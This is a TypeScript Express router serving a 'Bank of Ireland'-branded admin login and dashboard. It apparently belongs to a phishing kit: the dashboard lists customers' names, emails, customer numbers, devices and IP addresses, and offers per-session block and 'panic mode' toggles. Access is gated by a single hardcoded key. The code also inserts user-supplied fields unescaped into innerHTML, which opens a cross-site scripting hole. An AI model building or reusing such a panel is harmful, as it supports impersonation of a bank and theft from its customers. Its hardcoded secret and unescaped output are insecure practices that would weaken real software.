import express from 'express';

const router = express.Router();

// Admin authentication middleware
function adminAuth(req: express.Request, res: express.Response, next: express.NextFunction) {
  const isAuthenticated = req.session && (req.session as any).adminAuth === true;
  if (!isAuthenticated) {
    return res.redirect('/admin/login');
  }
  next();
}

// Admin login page
router.get('/login', (req, res) => {
  const loginPage = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="default">
      <meta name="format-detection" content="telephone=no">
      <title>Bank of Ireland - Admin Access</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        
        @font-face {
          font-family: 'OpenSans';
          src: url('/OpenSans-Regular-webfont.woff') format('woff'),
               url('/OpenSans-Regular-webfont.ttf') format('truetype');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'OpenSans';
          src: url('/OpenSans-Semibold-webfont.woff') format('woff'),
               url('/OpenSans-Semibold-webfont.ttf') format('truetype');
          font-weight: 600;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'OpenSans';
          src: url('/OpenSans-Bold-webfont.woff') format('woff'),
               url('/OpenSans-Bold-webfont.ttf') format('truetype');
          font-weight: 700;
          font-style: normal;
          font-display: swap;
        }
        
        html {
          -webkit-text-size-adjust: 100%;
          font-size: 16px;
          height: 100%;
        }
        body { 
          font-family: 'OpenSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
          background: #0050AA;
          margin: 0; 
          padding: 0; 
          min-height: 100vh; 
          position: relative;
          -webkit-user-select: none;
          user-select: none;
          touch-action: manipulation;
          overflow-x: hidden;
        }
        
        .ios-safe-area {
          min-height: 100vh;
          min-height: 100dvh;
          padding-top: env(safe-area-inset-top, 0px);
          padding-bottom: env(safe-area-inset-bottom, 0px);
          padding-left: env(safe-area-inset-left, 0px);
          padding-right: env(safe-area-inset-right, 0px);
          display: flex;
          flex-direction: column;
        }
        
        .header-section {
          background: #0050AA;
          padding: 2rem 1.5rem 1rem 1.5rem;
          text-align: center;
          flex-shrink: 0;
        }
        
        .boi-logo {
          width: 140px;
          height: 45px;
          background: white;
          border-radius: 4px;
          margin: 0 auto 1.5rem auto;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 8px;
          background-image: url('/boi_logo.svg');
          background-size: contain;
          background-repeat: no-repeat;
          background-position: center;
        }
        
        .header-title {
          color: white;
          font-size: 1.5rem;
          font-weight: 300;
          margin-bottom: 0.5rem;
          letter-spacing: -0.5px;
        }
        
        .header-subtitle {
          color: rgba(255,255,255,0.8);
          font-size: 0.9rem;
          font-weight: 400;
        }
        
        .content-section {
          flex: 1;
          background: #f8f9fa;
          border-top-left-radius: 24px;
          border-top-right-radius: 24px;
          padding: 2rem 1.5rem;
          margin-top: 1rem;
          position: relative;
        }
        
        .login-form {
          max-width: 400px;
          margin: 0 auto;
        }
        
        .form-title {
          color: #1a1a1a;
          font-size: 1.25rem;
          font-weight: 600;
          margin-bottom: 0.5rem;
          text-align: center;
        }
        
        .form-subtitle {
          color: #666;
          font-size: 0.9rem;
          text-align: center;
          margin-bottom: 2rem;
          line-height: 1.4;
        }
        
        .input-group {
          margin-bottom: 1.5rem;
        }
        
        .input-label {
          display: block;
          color: #333;
          font-size: 0.9rem;
          font-weight: 500;
          margin-bottom: 0.5rem;
        }
        
        .input-field {
          width: 100%;
          padding: 1rem;
          border: 2px solid #e1e5e9;
          border-radius: 12px;
          font-size: 1rem;
          background: white;
          transition: all 0.2s ease;
          -webkit-appearance: none;
          appearance: none;
        }
        
        .input-field:focus {
          outline: none;
          border-color: #0050AA;
          box-shadow: 0 0 0 3px rgba(0,80,170,0.1);
        }
        
        .login-button {
          width: 100%;
          background: #0050AA;
          color: white;
          border: none;
          padding: 1rem;
          border-radius: 12px;
          font-size: 1rem;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
          margin-top: 1rem;
          -webkit-appearance: none;
          appearance: none;
        }
        
        .login-button:hover {
          background: #004494;
        }
        
        .login-button:active {
          transform: scale(0.98);
          background: #003d7a;
        }
        
        .error-message {
          background: #fee;
          color: #c53030;
          padding: 1rem;
          border-radius: 12px;
          margin-bottom: 1rem;
          font-size: 0.9rem;
          text-align: center;
          border: 1px solid #fecaca;
          display: none;
        }
        
        .security-notice {
          background: rgba(0,80,170,0.05);
          border: 1px solid rgba(0,80,170,0.1);
          border-radius: 12px;
          padding: 1rem;
          margin-top: 2rem;
          text-align: center;
        }
        
        .security-notice-icon {
          font-size: 1.5rem;
          margin-bottom: 0.5rem;
        }
        
        .security-notice-text {
          color: #666;
          font-size: 0.85rem;
          line-height: 1.4;
        }
        
        /* iOS specific optimizations */
        @media screen and (max-width: 480px) {
          .header-section {
            padding: 1.5rem 1rem 0.75rem 1rem;
          }
          
          .boi-logo {
            width: 120px;
            height: 38px;
            font-size: 12px;
            margin-bottom: 1rem;
          }
          
          .header-title {
            font-size: 1.3rem;
          }
          
          .header-subtitle {
            font-size: 0.85rem;
          }
          
          .content-section {
            padding: 1.5rem 1rem;
            border-top-left-radius: 20px;
            border-top-right-radius: 20px;
          }
          
          .form-title {
            font-size: 1.1rem;
          }
          
          .form-subtitle {
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
          }
          
          .input-field {
            padding: 0.875rem;
            font-size: 16px; /* Prevents zoom on iOS */
          }
          
          .login-button {
            padding: 0.875rem;
            font-size: 1rem;
          }
        }
        
        /* Dark mode support */
        @media (prefers-color-scheme: dark) {
          .content-section {
            background: #1a1a1a;
          }
          
          .form-title {
            color: white;
          }
          
          .form-subtitle {
            color: #999;
          }
          
          .input-label {
            color: #ccc;
          }
          
          .input-field {
            background: #2a2a2a;
            border-color: #444;
            color: white;
          }
          
          .input-field:focus {
            border-color: #0050AA;
            background: #333;
          }
          
          .security-notice {
            background: rgba(0,80,170,0.1);
            border-color: rgba(0,80,170,0.2);
          }
          
          .security-notice-text {
            color: #999;
          }
        }
      </style>
    </head>
    <body>
      <div class="ios-safe-area">
        <div class="header-section">
          <div class="boi-logo"></div>
          <h1 class="header-title">Admin Access</h1>
          <p class="header-subtitle">Secure Banking Administration</p>
        </div>
        
        <div class="content-section">
          <div class="login-form">
            <h2 class="form-title">Sign In</h2>
            <p class="form-subtitle">Enter your admin credentials to access the banking administration panel</p>
            
            <div id="error" class="error-message"></div>
            
            <form onsubmit="login(event)">
              <div class="input-group">
                <label for="adminKey" class="input-label">Admin Access Key</label>
                <input 
                  type="password" 
                  id="adminKey" 
                  class="input-field"
                  placeholder="Enter your secure access key" 
                  required 
                  autocomplete="current-password"
                />
              </div>
              
              <button type="submit" class="login-button">Access Admin Panel</button>
            </form>
            
            <div class="security-notice">
              <div class="security-notice-icon">🔒</div>
              <p class="security-notice-text">
                This is a secure area restricted to authorized Bank of Ireland administrators only. 
                All access attempts are monitored and logged.
              </p>
            </div>
          </div>
        </div>
      </div>
      
      <script>
        async function login(event) {
          event.preventDefault();
          
          const adminKey = document.getElementById('adminKey').value;
          const errorDiv = document.getElementById('error');
          const loginButton = document.querySelector('.login-button');
          
          if (!adminKey) {
            showError('Please enter your admin access key');
            return;
          }
          
          // Show loading state
          loginButton.textContent = 'Authenticating...';
          loginButton.disabled = true;
          
          try {
            const response = await fetch('/admin/login', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({ adminKey })
            });
            
            const data = await response.json();
            
            if (data.success) {
              window.location.href = data.redirect;
            } else {
              showError(data.message || 'Invalid access key. Please check your credentials and try again.');
              document.getElementById('adminKey').value = '';
            }
          } catch (error) {
            showError('Network error. Please try again.');
            console.error('Login error:', error);
          } finally {
            // Reset button state
            loginButton.textContent = 'Access Admin Panel';
            loginButton.disabled = false;
          }
        }
        
        function showError(message) {
          const errorDiv = document.getElementById('error');
          errorDiv.textContent = message;
          errorDiv.style.display = 'block';
          
          // Auto-hide error after 5 seconds
          setTimeout(() => {
            errorDiv.style.display = 'none';
          }, 5000);
          
          // Add shake animation to form
          const form = document.querySelector('.login-form');
          form.style.animation = 'shake 0.5s ease-in-out';
          setTimeout(() => {
            form.style.animation = '';
          }, 500);
        }
        
        // Add shake animation
        const style = document.createElement('style');
        style.textContent = \`
          @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
          }
        \`;
        document.head.appendChild(style);
        
        // Focus the input field on load
        window.addEventListener('load', () => {
          document.getElementById('adminKey').focus();
        });
        
        // Prevent zoom on double tap for iOS
        let lastTouchEnd = 0;
        document.addEventListener('touchend', (event) => {
          const now = (new Date()).getTime();
          if (now - lastTouchEnd <= 300) {
            event.preventDefault();
          }
          lastTouchEnd = now;
        }, false);
      </script>
    </body>
    </html>
  `;
  
  res.send(loginPage);
});

// Handle admin login POST
router.post('/login', (req, res) => {
  const { adminKey } = req.body;
  
  if (adminKey === 'BOI_ADMIN_2025_SECURE') {
    // Set server-side session
    (req.session as any).adminAuth = true;
    res.json({ success: true, redirect: '/admin/dashboard' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid admin key' });
  }
});

// Admin dashboard
router.get('/dashboard', adminAuth, (req, res) => {
  const adminPanel = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
      <meta name="format-detection" content="telephone=no">
      <title>BOI Banking Admin Dashboard</title>
      <style>
        * { 
          margin: 0; 
          padding: 0; 
          box-sizing: border-box; 
        }
        
        @font-face {
          font-family: 'OpenSans';
          src: url('/OpenSans-Regular-webfont.woff') format('woff'),
               url('/OpenSans-Regular-webfont.ttf') format('truetype');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'OpenSans';
          src: url('/OpenSans-Semibold-webfont.woff') format('woff'),
               url('/OpenSans-Semibold-webfont.ttf') format('truetype');
          font-weight: 600;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'OpenSans';
          src: url('/OpenSans-Bold-webfont.woff') format('woff'),
               url('/OpenSans-Bold-webfont.ttf') format('truetype');
          font-weight: 700;
          font-style: normal;
          font-display: swap;
        }
        
        html {
          -webkit-text-size-adjust: 100%;
          font-size: 16px;
          overflow-x: hidden;
        }
        body { 
          font-family: 'OpenSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          line-height: 1.6; 
          overflow-x: hidden;
          min-height: 100vh;
          position: relative;
          -webkit-user-select: none;
          user-select: none;
          touch-action: manipulation;
        }
        .header { 
          background: #0050AA;
          color: white; 
          padding: 1.5rem 0; 
          text-align: center; 
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          display: flex;
          flex-direction: column;
          align-items: center;
        }
        .header-logo {
          width: 80px;
          height: 26px;
          background: white;
          border-radius: 4px;
          margin-bottom: 1rem;
          background-image: url('/boi_logo.svg');
          background-size: contain;
          background-repeat: no-repeat;
          background-position: center;
          padding: 4px;
        }
        .header h1 {
          font-size: 1.4rem;
          font-weight: 600;
          margin-bottom: 0.25rem;
          font-family: 'OpenSans', sans-serif;
        }
        .header p {
          font-size: 0.9rem;
          opacity: 0.9;
          font-weight: 400;
        }
        .container { 
          max-width: 1400px; 
          margin: -1rem auto 2rem auto; 
          padding: 0 1rem; 
        }
        .section { 
          background: rgba(255, 255, 255, 0.95);
          backdrop-filter: blur(10px);
          margin-bottom: 1rem; 
          padding: 1rem; 
          border-radius: 12px; 
          box-shadow: 0 4px 16px rgba(0,0,0,0.08);
          border: 1px solid rgba(255,255,255,0.2);
          transition: all 0.3s ease;
        }
        .section:hover {
          transform: translateY(-2px);
          box-shadow: 0 12px 40px rgba(0,0,0,0.15);
        }
        .section h2 { 
          color: #1e3c72; 
          margin-bottom: 1rem; 
          font-size: 1.1rem;
          font-weight: 600;
          display: flex;
          align-items: center;
          gap: 0.5rem;
        }
        .btn { 
          padding: 0.75rem 1.5rem; 
          border: none; 
          border-radius: 8px; 
          cursor: pointer; 
          margin: 0.25rem; 
          font-size: 0.95rem; 
          font-weight: 500;
          transition: all 0.3s ease;
          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .btn-success { 
          background: linear-gradient(135deg, #27ae60, #2ecc71); 
          color: white; 
        }
        .btn-danger { 
          background: linear-gradient(135deg, #e74c3c, #c0392b); 
          color: white; 
        }
        .btn-primary { 
          background: linear-gradient(135deg, #3498db, #2980b9); 
          color: white; 
        }
        .btn:hover { 
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        .device-card {
          background: rgba(255,255,255,0.9);
          border: 1px solid rgba(255,255,255,0.3);
          border-radius: 8px;
          margin-bottom: 0.75rem;
          padding: 0.75rem;
          border-left: 4px solid #3498db;
          transition: all 0.3s ease;
        }
        .device-card.panic {
          border-left-color: #e74c3c;
          background: rgba(255,235,238,0.9);
        }
        .device-header {
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
          margin-bottom: 0.5rem;
        }
        .device-name {
          font-weight: 600;
          color: #1e3c72;
          font-size: 0.75rem;
        }
        .device-info {
          color: #666;
          font-size: 0.7rem;
          line-height: 1.3;
        }
        .device-buttons {
          display: flex;
          gap: 0.5rem;
          margin-top: 0.5rem;
        }
        .device-buttons .btn {
          font-size: 0.6rem;
          padding: 0.4rem 0.8rem;
          flex: 1;
        }
        .panic-status {
          padding: 0.5rem;
          border-radius: 6px;
          font-size: 0.65rem;
          font-weight: 600;
          text-align: center;
          text-transform: uppercase;
        }
        .panic-active {
          background: #ffebee;
          color: #c62828;
        }
        .panic-normal {
          background: #e8f5e8;
          color: #2e7d32;
        }
        
        /* iOS optimized responsive design */
        @media screen and (max-width: 480px) {
          body {
            -webkit-text-size-adjust: 100%;
            font-size: 14px;
          }
          .header {
            padding: 1rem 0;
          }
          .header-logo {
            width: 70px;
            height: 22px;
            margin-bottom: 0.75rem;
          }
          .header h1 {
            font-size: 1.2rem;
            margin-bottom: 0.25rem;
          }
          .header p {
            font-size: 0.8rem;
          }
          .container {
            padding: 0 0.5rem;
            margin-top: -0.5rem;
          }
          .section {
            padding: 0.75rem;
            margin-bottom: 0.75rem;
            border-radius: 8px;
          }
          .section h2 {
            font-size: 0.95rem;
            margin-bottom: 0.75rem;
          }
          .btn {
            font-size: 0.7rem;
            padding: 0.4rem 0.8rem;
          }
          .device-card {
            padding: 0.6rem;
          }
          .device-name {
            font-size: 0.7rem;
          }
          .device-info {
            font-size: 0.65rem;
          }
          .device-buttons .btn {
            font-size: 0.55rem;
            padding: 0.35rem 0.6rem;
          }
        }
      </style>
    </head>
    <body>
      <div class="header">
        <div class="header-logo"></div>
        <h1>Admin Dashboard</h1>
        <p>Banking Administration & Security Control</p>
      </div>
      
      <div class="container">
        <div class="section">
          <h2>📊 User Accounts Overview</h2>
          <div id="userAccounts">Loading user accounts...</div>
        </div>
        
        <div class="section">
          <h2>📱 Device & Session Monitor</h2>
          <div id="deviceSessions">Loading device sessions...</div>
        </div>
      </div>
      
      <script>
        // Load user accounts
        async function loadUserAccounts() {
          try {
            const response = await fetch('/api/admin/users');
            const data = await response.json();
            
            if (data.success) {
              displayUserAccounts(data.users);
            } else {
              document.getElementById('userAccounts').innerHTML = '<p>Error loading user accounts</p>';
            }
          } catch (error) {
            document.getElementById('userAccounts').innerHTML = '<p>Failed to load user accounts</p>';
          }
        }
        
        // Display user accounts
        function displayUserAccounts(users) {
          const container = document.getElementById('userAccounts');
          
          if (users.length === 0) {
            container.innerHTML = '<p>No user accounts found</p>';
            return;
          }
          
          let html = '';
          users.forEach(user => {
            html += \`
              <div class="device-card">
                <div class="device-header">
                  <div>
                    <div class="device-name">\${user.name || 'Anonymous User'}</div>
                    <div class="device-info">
                      Email: \${user.email || 'N/A'}<br>
                      Customer #: \${user.customerId || 'N/A'}<br>
                      Device: \${user.deviceInfo || 'Unknown'}<br>
                      IP: \${user.lastLoginIp || 'N/A'}
                    </div>
                  </div>
                </div>
                <div class="device-buttons">
                  <button class="btn btn-primary" onclick="viewUserDetails('\${user.id}')">View Details</button>
                  <button class="btn btn-danger" onclick="disableUser('\${user.id}')">Disable</button>
                </div>
              </div>
            \`;
          });
          
          container.innerHTML = html;
        }
        
        // Load device sessions
        async function loadDeviceSessions() {
          try {
            const response = await fetch('/api/admin/device-sessions');
            const data = await response.json();
            
            if (data.success) {
              displayDeviceSessions(data.sessions);
            } else {
              document.getElementById('deviceSessions').innerHTML = '<p>Error loading device sessions</p>';
            }
          } catch (error) {
            document.getElementById('deviceSessions').innerHTML = '<p>Failed to load device sessions</p>';
          }
        }
        
        // Display device sessions grouped by account
        function displayDeviceSessions(sessions) {
          const container = document.getElementById('deviceSessions');
          
          if (sessions.length === 0) {
            container.innerHTML = '<p>No active device sessions</p>';
            return;
          }
          
          // Group sessions by account
          const groupedSessions = {};
          sessions.forEach(session => {
            const accountKey = session.accountName || 'Unknown Account';
            if (!groupedSessions[accountKey]) {
              groupedSessions[accountKey] = [];
            }
            groupedSessions[accountKey].push(session);
          });
          
          let html = '';
          Object.keys(groupedSessions).forEach(accountName => {
            const accountSessions = groupedSessions[accountName];
            const firstSession = accountSessions[0];
            
            html += \`
              <div style="margin-bottom: 1rem;">
                <div style="font-size: 0.75rem; font-weight: 600; color: #1e3c72; margin-bottom: 0.5rem;">
                  \${accountName}
                  \${firstSession.accountEmail ? \` (\${firstSession.accountEmail})\` : ''}
                </div>
            \`;
            
            accountSessions.forEach(session => {
              const isPanic = session.panicMode === true;
              html += \`
                <div class="device-card \${isPanic ? 'panic' : ''}">
                  <div class="device-header">
                    <div>
                      <div class="device-name">\${session.deviceModel || 'Unknown Device'}</div>
                      <div class="device-info">
                        IP: \${session.ipAddress || 'N/A'}<br>
                        Status: <span class="panic-status \${isPanic ? 'panic-active' : 'panic-normal'}">
                          \${isPanic ? 'PANIC ACTIVE' : 'NORMAL'}
                        </span>
                      </div>
                    </div>
                  </div>
                  <div class="device-buttons">
                    <button class="btn \${session.blocked ? 'btn-success' : 'btn-danger'}" 
                            onclick="toggleBlock('\${session.sessionId}', \${session.blocked})">
                      \${session.blocked ? 'Unblock' : 'Block'} Device
                    </button>
                    <button class="btn \${isPanic ? 'btn-success' : 'btn-danger'}" 
                            onclick="togglePanic('\${session.sessionId}', \${isPanic})">
                      \${isPanic ? 'Disable Panic' : 'Enable Panic'}
                    </button>
                  </div>
                </div>
              \`;
            });
            
            html += '</div>';
          });
          
          container.innerHTML = html;
        }
        
        // Toggle device block status
        async function toggleBlock(sessionId, currentBlocked) {
          const action = currentBlocked ? 'unblock' : 'block';
          try {
            const response = await fetch(\`/api/admin/device-sessions/\${sessionId}/\${action}\`, {
              method: 'POST'
            });
            const data = await response.json();
            
            if (data.success) {
              loadDeviceSessions(); // Reload to show updated status
            }
          } catch (error) {
            console.error('Error toggling device block:', error);
          }
        }
        
        // Toggle panic mode for specific device
        async function togglePanic(sessionId, currentPanic) {
          const action = currentPanic ? 'disable' : 'enable';
          try {
            const response = await fetch(\`/api/admin/device-sessions/\${sessionId}/panic-\${action}\`, {
              method: 'POST'
            });
            const data = await response.json();
            
            if (data.success) {
              loadDeviceSessions(); // Reload to show updated status
            }
          } catch (error) {
            console.error('Error toggling panic mode:', error);
          }
        }
        
        // View user details
        function viewUserDetails(userId) {
          alert('User details view not implemented yet');
        }
        
        // Disable user
        async function disableUser(userId) {
          if (confirm('Are you sure you want to disable this user?')) {
            alert('User disable functionality not implemented yet');
          }
        }
        
        // Load data on page load
        window.addEventListener('load', () => {
          loadUserAccounts();
          loadDeviceSessions();
          
          // Refresh data every 30 seconds
          setInterval(() => {
            loadUserAccounts();
            loadDeviceSessions();
          }, 30000);
        });
      </script>
    </body>
    </html>
  `;
  
  res.send(adminPanel);
});

export default router;